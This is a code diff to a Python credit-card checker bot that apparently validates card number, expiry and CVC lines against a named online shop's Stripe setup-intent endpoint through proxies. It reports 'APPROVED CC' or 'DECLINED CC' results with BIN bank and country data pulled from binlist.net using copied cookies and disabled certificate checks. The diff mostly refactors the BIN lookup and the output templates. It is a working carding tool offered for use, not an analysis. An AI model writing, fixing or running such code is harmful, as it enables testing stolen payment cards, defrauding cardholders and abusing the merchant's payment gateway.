@@ -249,9 +249,9 @@ def get_final_message(website_response, proxy_str=None):
     except:
         return "Unknown response"
 
-# BIN lookup function - USING COOKIE-BASED APPROACH
+# BIN lookup function - USING COOKIE-BASED APPROACH EXACTLY LIKE PHP
 def get_bin_info(card_number):
-    """Get BIN information using binlist.net API with proper headers and cookies"""
+    """Get BIN information using binlist.net API with exact cookie from PHP"""
     if not card_number or len(card_number) < 6:
         return {
             'bank': 'Unavailable',
@@ -262,70 +262,55 @@ def get_bin_info(card_number):
             'emoji': '🏳️'
         }
     
-    # Use first 6 digits (standard BIN length) - CLEAN THE CARD NUMBER
+    # Use first 6 digits (standard BIN length)
     clean_card = ''.join(filter(str.isdigit, card_number))
     bin_code = clean_card[:6]
     
     try:
-        # Small delay to avoid rate limiting
+        # Small delay
         time.sleep(0.2)
         
-        # Prepare headers with proper cookies and user-agent
+        # EXACT headers from PHP code
         headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'Host': 'lookup.binlist.net',
             'Cookie': '_ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'none',
-            'Sec-Fetch-User': '?1',
-            'Cache-Control': 'max-age=0'
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
         }
         
-        # Using binlist.net API with proper headers
+        # Make request
         api_url = f"https://lookup.binlist.net/{bin_code}"
-        
         response = requests.get(api_url, headers=headers, timeout=10, verify=False)
         
+        # Check response
         if response.status_code == 200:
+            # Try to parse JSON
             try:
                 data = response.json()
                 
-                # Parse response
-                bank_name = data.get('bank', {}).get('name', 'Unavailable')
-                if not bank_name or bank_name == 'None':
+                # Get bank name
+                bank_name = data.get('bank', {}).get('name', '')
+                if not bank_name:
                     bank_name = 'Unavailable'
                 
+                # Get country
                 country_name = data.get('country', {}).get('name', 'Unknown')
-                if not country_name or country_name == 'None':
-                    country_name = 'Unknown'
-                
-                brand = data.get('scheme', 'Unknown')
-                if not brand or brand == 'None':
-                    brand = 'Unknown'
-                
-                card_type = data.get('type', 'Unknown')
-                if not card_type or card_type == 'None':
-                    card_type = 'Unknown'
-                
                 country_code = data.get('country', {}).get('alpha2', '')
-                if not country_code or country_code == 'None':
-                    country_code = ''
                 
-                # Determine card type from response
-                response_text = response.text
-                if '"type":"credit"' in response_text:
-                    card_type = 'Credit'
-                elif '"type":"debit"' in response_text:
-                    card_type = 'Debit'
+                # Get brand/scheme
+                brand = data.get('scheme', 'Unknown')
                 
-                # For level, use brand
-                level = brand if brand != 'Unknown' else 'Unknown'
+                # Get type from JSON or from response text
+                card_type = data.get('type', '')
+                if not card_type:
+                    # Check response text like PHP does
+                    response_text = response.text
+                    if '"type":"credit"' in response_text:
+                        card_type = 'Credit'
+                    elif '"type":"debit"' in response_text:
+                        card_type = 'Debit'
+                    else:
+                        card_type = 'Unknown'
                 
                 # Get emoji
                 emoji = get_country_emoji(country_code)
@@ -335,53 +320,49 @@ def get_bin_info(card_number):
                     'country': country_name,
                     'brand': brand,
                     'type': card_type,
-                    'level': level,
+                    'level': brand,  # Use brand as level
                     'emoji': emoji
                 }
                 
-            except json.JSONDecodeError:
-                # If JSON parsing fails, return default values
+            except:
+                # If JSON fails, try to extract from text
+                response_text = response.text
+                
+                # Try to find bank name
+                bank_match = re.search(r'"name"\s*:\s*"([^"]+)"', response_text)
+                bank_name = bank_match.group(1) if bank_match else 'Unavailable'
+                
+                # Try to find country
+                country_match = re.search(r'"country".*?"name"\s*:\s*"([^"]+)"', response_text)
+                country_name = country_match.group(1) if country_match else 'Unknown'
+                
+                # Try to find country code
+                code_match = re.search(r'"alpha2"\s*:\s*"([^"]+)"', response_text)
+                country_code = code_match.group(1) if code_match else ''
+                
+                # Try to find scheme/brand
+                scheme_match = re.search(r'"scheme"\s*:\s*"([^"]+)"', response_text)
+                brand = scheme_match.group(1) if scheme_match else 'Unknown'
+                
+                # Determine card type
+                card_type = 'Unknown'
+                if '"type":"credit"' in response_text:
+                    card_type = 'Credit'
+                elif '"type":"debit"' in response_text:
+                    card_type = 'Debit'
+                
+                emoji = get_country_emoji(country_code)
+                
                 return {
-                    'bank': 'Unavailable',
-                    'country': 'Unknown',
-                    'brand': 'Unknown',
-                    'type': 'Unknown',
-                    'level': 'Unknown',
-                    'emoji': '🏳️'
+                    'bank': bank_name,
+                    'country': country_name,
+                    'brand': brand,
+                    'type': card_type,
+                    'level': brand,
+                    'emoji': emoji
                 }
         else:
-            # If API call failed, try alternative approach with different headers
-            try:
-                # Alternative headers
-                headers2 = {
-                    'User-Agent': get_rotating_user_agent(),
-                    'Accept': 'application/json',
-                    'X-BinLookup-Version': '3',
-                    'X-Requested-With': 'XMLHttpRequest'
-                }
-                
-                response2 = requests.get(api_url, headers=headers2, timeout=5, verify=False)
-                if response2.status_code == 200:
-                    data = response2.json()
-                    
-                    bank_name = data.get('bank', {}).get('name', 'Unavailable')
-                    country_name = data.get('country', {}).get('name', 'Unknown')
-                    brand = data.get('scheme', 'Unknown')
-                    card_type = data.get('type', 'Unknown')
-                    country_code = data.get('country', {}).get('alpha2', '')
-                    
-                    return {
-                        'bank': bank_name if bank_name else 'Unavailable',
-                        'country': country_name if country_name else 'Unknown',
-                        'brand': brand if brand else 'Unknown',
-                        'type': card_type if card_type else 'Unknown',
-                        'level': brand if brand else 'Unknown',
-                        'emoji': get_country_emoji(country_code)
-                    }
-            except:
-                pass
-            
-            # Return default values
+            # If failed, return defaults
             return {
                 'bank': 'Unavailable',
                 'country': 'Unknown',
@@ -392,8 +373,7 @@ def get_bin_info(card_number):
             }
             
     except Exception as e:
-        # Print debug info
-        print(f"BIN lookup error for {bin_code}: {str(e)[:100]}")
+        # If any error, return defaults
         return {
             'bank': 'Unavailable',
             'country': 'Unknown',
@@ -405,7 +385,7 @@ def get_bin_info(card_number):
 
 def get_country_emoji(country_code):
     """Convert country code to emoji"""
-    if not country_code or len(country_code) != 2 or country_code == 'None':
+    if not country_code or len(country_code) != 2:
         return '🏳️'
     
     try:
@@ -447,7 +427,6 @@ def check_card_stripe(cc_line):
         account_created, account_msg = create_new_account(session, proxy_str)
         if not account_created:
             elapsed_time = time.time() - start_time
-            # Get BIN info using new cookie-based API
             bin_info = get_bin_info(n)
             return f"""
 DECLINED CC ❌
@@ -456,9 +435,9 @@ DECLINED CC ❌
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Account creation failed
 💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1
 
-📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
-🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
-🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
+🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
 🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
 
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
@@ -468,7 +447,6 @@ DECLINED CC ❌
         ajax_nonce, nonce_msg = get_payment_nonce(session, proxy_str)
         if not ajax_nonce:
             elapsed_time = time.time() - start_time
-            # Get BIN info using new cookie-based API
             bin_info = get_bin_info(n)
             return f"""
 DECLINED CC ❌
@@ -477,9 +455,9 @@ DECLINED CC ❌
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Payment nonce failed
 💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1
 
-📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
-🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
-🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
+🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
 🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
 
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
@@ -527,14 +505,10 @@ DECLINED CC ❌
             response2 = session.post('https://firstcornershop.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', headers=headers2, data=data2, proxies=proxies, timeout=30)
             website_response = response2.json()
             
-            # DEBUG: Print the raw response to see what we're getting
-            print(f"Raw response for debugging: {json.dumps(website_response, indent=2)}")
-            
             # Get final message with 3DS info
             final_message = get_final_message(website_response, proxy_str)
             
             elapsed_time = time.time() - start_time
-            # Get BIN info using new cookie-based API
             bin_info = get_bin_info(n)
             
             # Check the actual status from the response
@@ -550,9 +524,9 @@ APPROVED CC ✅
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
 💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1
 
-📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
-🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
-🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
+🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
 🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
 
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
@@ -565,9 +539,9 @@ APPROVED CC ✅
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
 💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1
 
-📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
-🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
-🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
+🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
 🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
 
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
@@ -578,11 +552,11 @@ DECLINED CC ❌
 
 💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
-💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝗻𝘆 ⇾ Stripe Auth  - 1
 
-📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
-🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
-🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
+🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
 🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
 
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
@@ -602,9 +576,9 @@ APPROVED CCN ✅
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
 💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1
 
-📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
-🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
-🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
+🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
 🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
 
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
@@ -617,9 +591,9 @@ DECLINED CC ❌
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
 💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1
 
-📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
-🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
-🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
+🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
 🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
 
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
@@ -627,7 +601,6 @@ DECLINED CC ❌
                 
         else:
             elapsed_time = time.time() - start_time
-            # Get BIN info using new cookie-based API
             bin_info = get_bin_info(n)
             return f"""
 DECLINED CC ❌
@@ -636,9 +609,9 @@ DECLINED CC ❌
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Stripe validation failed
 💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1
 
-📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
-🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
-🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
+🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
 🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
 
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
@@ -646,17 +619,16 @@ DECLINED CC ❌
 
     except Exception as e:
         elapsed_time = time.time() - start_time
-        # Get BIN info using new cookie-based API even for errors
         try:
             n = cc_line.strip().split('|')[0]
             bin_info = get_bin_info(n)
         except:
             bin_info = {
-                'bank': 'UNKNOWN',
-                'country': 'UNKNOWN',
-                'brand': 'UNKNOWN',
-                'type': 'UNKNOWN',
-                'level': 'UNKNOWN',
+                'bank': 'Unavailable',
+                'country': 'Unknown',
+                'brand': 'Unknown',
+                'type': 'Unknown',
+                'level': 'Unknown',
                 'emoji': '🏳️'
             }
         return f"""
@@ -666,9 +638,9 @@ ERROR ❌
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Request failed: {str(e)}
 💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1
 
-📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
-🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
-🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
+🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
 🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
 
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
